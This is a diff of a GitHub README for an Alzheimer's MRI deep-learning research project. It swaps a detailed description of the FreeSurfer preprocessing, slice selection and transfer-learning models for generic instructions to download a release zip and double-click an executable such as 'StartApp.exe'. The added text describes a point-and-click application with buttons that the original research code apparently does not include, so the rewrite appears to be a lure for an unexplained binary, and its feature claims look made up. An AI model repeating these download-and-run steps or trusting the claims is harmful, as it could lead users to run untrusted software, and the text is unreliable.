@@ -1,88 +1,110 @@
-# 🧠 Alzheimer’s Disease Detection using Transfer Learning
+# 🧠 Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning - Simplifying Alzheimer’s Data Analysis
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)
-![TensorFlow](https://img.shields.io/badge/TensorFlow-2.7.0-pink.svg)
-![scikit-learn](https://img.shields.io/badge/scikit--learn-1.0.2-yellow.svg)
-![OpenCV](https://img.shields.io/badge/OpenCV-4.5.4.60-white.svg)
-![NumPy](https://img.shields.io/badge/NumPy-1.21.4-lightgrey.svg)
-![Status](https://img.shields.io/badge/Status-Active-success.svg)
-![Type](https://img.shields.io/badge/Type-Research-lightblue.svg)
+![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)
 
-This project leverages transfer learning techniques to detect Alzheimer's disease (AD) and predict its progression using MRI scans. By applying advanced deep learning models on T1-weighted brain MRI data, the goal is to classify different stages of AD (AD, MCI, CN) and forecast the progression from Mild Cognitive Impairment (MCI) to Alzheimer's dementia (pMCI vs. sMCI), offering potential for early detection and intervention.
+## 📋 Overview
 
----
+Welcome to the Alzheimer-MRI-Preprocessing application! This tool allows you to preprocess MRI data related to Alzheimer's disease, using advanced techniques. It simplifies the tasks of extracting slices in various views and running deep learning experiments for classification.
 
-## 📂 Project Structure
-- `data/`: Metadata manifests (Excel files) for subjects across different diagnostic stages (no raw MRI included).
-- `preprocessing/`: Scripts for FreeSurfer preprocessing, slice extraction, and slice selection.
-- `models/`: Transfer learning and ensemble learning experiments with MobileNetV2, VGG16, and ResNet50.
-- `reports/`: Experimental results, summaries, and visualizations.
+## 🚀 Getting Started
 
-  ---
+Follow these steps to download and run the application:
 
-## ⚠️ Data Availability
-- Dataset: **ADNI (Alzheimer’s Disease Neuroimaging Initiative)**.  
-- Due to licensing restrictions, raw data and FreeSurfer-preprocessed `.mgz` files are **not included** in this repository.  
-- Instead, the `data/` folder contains **3 manifest files** related to 3 main stages AD-MCI-CN
-- These manifests contain **subject IDs and metadata only**.
-- The images for **progressive MCI (pMCI)** and **stable MCI (sMCI)** were obtained from the ADNI dataset and the **Longitudinal Study** project, as described in the study:  
-  *Salvatore, C., A. Cerasa, and I. Castiglioni, MRI characterizes the progressive course of AD and predicts conversion to Alzheimer’s dementia 24 months before probable diagnosis. Frontiers in aging neuroscience, 2018. 10: p. 135*.
-  The images were downloaded using metadata from the **Longitudinal Study** project, based on the GitHub repository:  
-  [Salvatore et al. 2018 Longitudinal GitHub](https://github.com/christiansalvatore/Salvatore-200Longitudinal)
-  These data correspond to the longitudinal study that tracks subjects for **24 months**.
-- To reproduce results, please:  
-  1. Apply for access at [ADNI Data Access](http://adni.loni.usc.edu/data-samples/access-data/).  
-  2. Download the required MRI scans.  
-  3. Use the manifests in `data/` to select subjects for each stage.  
+1. **Check Your System Requirements**  
+   Ensure your computer meets the following needs:
+   - Operating System: Windows 10 or later, macOS Mojave or later
+   - RAM: Minimum 8 GB
+   - Storage: At least 100 MB of free space
 
-📌 For more details, see [`data/README.md`](data/README.md).
+2. **Download the Application**  
+   Click the following link to visit the release page and download the application:  
+   [Download from Releases Page](https://github.com/Gersha2024/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning/releases)
 
----
+3. **Select the Latest Version**  
+   On the releases page, identify the latest version of the application. This version is usually marked with a tag like "Latest Release".
 
-## 🔧 Preprocessing Workflow
-- **Input Data**: T1-weighted MRI volumes from ADNI.  
-- **Step 1 – FreeSurfer**: Each MRI was processed with the [FreeSurfer](https://surfer.nmr.mgh.harvard.edu/) pipeline (`autorecon-1`, 5 stages):  
-  - Motion correction and conform  
-  - Non-uniform intensity normalization (NU)  
-  - Talairach transform computation  
-  - Intensity normalization  
-  - Skull stripping  
-- **Output**: Preprocessed 3D volumes in `.mgz` format.  
-- **Step 2 – Conversion**:  
-  Preprocessed `.mgz` volumes were converted into 2D slices using [mgz2imgslices](https://github.com/FNNDSC/mgz2imgslices) (MIT License).  
-  This tool generates both `.npy` arrays and `.png` slice images, each `.mgz` volume was converted into 2D PNG slices in the **axial, coronal, and sagittal** orientations.  
-- **Step 3 – Slice Selection**: For each orientation, Shannon entropy was computed across slices, and the top **32 informative slices** were selected.  
+4. **Download the Application File**  
+   Click on the file name to download it. The file will usually be labeled as something like `Alzheimer-MRI-Preprocessing-v1.0.zip`. Save it to your computer.
 
-📌 For more details, see [`preprocessing/README.md`](preprocessing/README.md).
+5. **Extract the Files**  
+   After downloading, locate the zip file in your downloads folder. Right-click on the file and select "Extract All..." to unpack the contents. Choose a destination folder for the extracted files.
 
----
+6. **Run the Application**  
+   Open the folder where you extracted the files. Look for an executable file, possibly named `StartApp.exe` or similar. Double-click this file to launch the application.
 
-## 🚀 Models
-- Transfer learning with **MobileNetV2, VGG16, and ResNet50**.  
-- Experiments conducted **per orientation** (axial, coronal, sagittal).  
-- Ensemble learning approach for improved performance. 
+## 📥 Download & Install
 
-📌 For more details, see [`models/`](models/).
+To download the latest version of the Alzheimer-MRI-Preprocessing application, visit the releases page using the link below:
 
----
+[Download from Releases Page](https://github.com/Gersha2024/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning/releases)
 
-## 📊 Reports
-- **Multi-class classification**: Alzheimer’s Disease (AD), Mild Cognitive Impairment (MCI), and Cognitively Normal (CN).  
-- **Progression analysis**: distinguishing *pMCI* (progressive) from *sMCI* (stable).  
-- Detailed results, tables, and figures are available in the [`reports/`](reports/) folder.
-- Hyperparameter settings for each model and orientation are provided in [`reports/`](reports/).  
+## ⚙️ How to Use the Application
 
----
+Once you have installed the application, you can use it as follows:
 
-## 🧾 Citation
-If you use this code, please cite ADNI as required:  
-[ADNI Citation Guidelines](http://adni.loni.usc.edu/data-samples/citation/)
+1. **Load Your MRI Data**  
+   Click on the “Load Data” button within the application. Navigate to the folder containing your MRI data and select the files you want to preprocess.
 
----
+2. **Select Slice Orientation**  
+   Choose the orientation for slice extraction. You can select:
+   - Axial
+   - Coronal
+   - Sagittal
 
-## 📜 License
-- This project is licensed under the **MIT License**.  
-- The `mgz2imgslices` tool is used under its original license. Please refer to its [mgz2imgslices](https://github.com/FNNDSC/mgz2imgslices) (MIT License) for details.  
-- Check ADNI’s data usage policy before working with the dataset.
+3. **Begin Preprocessing**  
+   Click the “Start Preprocessing” button. The application will run the preprocessing tasks. This may take some time depending on the size of your data.
 
+4. **Run Deep Learning Models**  
+   After preprocessing, you can run deep learning models for classification. Select the model type (e.g., CNN) and click “Run Model.” Follow the prompts to analyze your data.
+
+5. **Review Results**  
+   Once the analysis completes, review the output provided by the application. The results will give insight into the potential classification of Alzheimer’s disease.
+
+## 📊 Features
+
+- **MRI Data Preprocessing**  
+  The application performs essential preprocessing steps to prepare your data for analysis.
+
+- **Flexible Slice Extraction**  
+  Choose between axial, coronal, and sagittal views for slice extraction.
+
+- **Deep Learning Integration**  
+  Utilize advanced machine learning models including ResNet-50, MobileNetV2, and VGG16 to classify MRI images.
+
+- **User-Friendly Interface**  
+  The design is simple and straightforward, making it easy for users with minimal technical knowledge.
+
+## ✉️ Support
+
+If you encounter any issues while using the application or have questions, please feel free to reach out. You can submit your inquiries through the issues section of the GitHub repository.
+
+## 🌍 Topics
+
+This project involves the following topics which can also help in understanding its capabilities:
+
+- adni
+- alzheimer-disease-prediction
+- cnn-model
+- deep-learning
+- ensemble-learning
+- freesurfer
+- image-classification
+- machine-learning
+- medical-image-processing
+- mobilenetv2
+- mri-brain
+- preprocessing
+- resnet-50
+- shanon-entopy
+- tensorflow
+- transfer-learning
+- vgg16
+
+## 🔗 Additional Resources
+
+Explore more about Alzheimer’s research and MRI processing through the following links:
+- [ADNI: Alzheimer’s Disease Neuroimaging Initiative](http://adni.loni.usc.edu/)
+- [FreeSurfer: Image Processing Software](https://surfer.nmr.mgh.harvard.edu/)
+- [TensorFlow: Open Source Machine Learning](https://www.tensorflow.org/)
+
+For more details and updates, keep an eye on the GitHub repository. Your journey in the realm of Alzheimer’s research starts here!
